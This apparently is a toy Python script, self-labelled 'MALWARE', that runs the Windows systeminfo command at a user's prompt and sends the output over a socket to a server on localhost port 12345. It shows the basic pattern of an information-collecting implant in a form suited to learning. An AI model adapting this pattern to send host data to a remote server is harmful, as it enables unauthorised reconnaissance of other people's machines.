import socket, subprocess


def connect_to_server(data='I am MALWARE!'):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('127.0.0.1', 12345))
    client.send(data.encode())
    from_server = client.recv(4096)
    print(from_server.decode())
    client.close()


def systemInfo():
    p = subprocess.Popen(["systeminfo"], stdout=subprocess.PIPE)
    result = p.communicate()
    info = result[0].decode("utf-8")
    return info


def loop():
    while True:
        command = input("Enter sysinfo to get the system information: ")
        if command.lower() == "sysinfo":
            connect_to_server(systemInfo())
        else:
            print("Invalid command! Try again...")


# connect_to_server(systemInfo())
loop()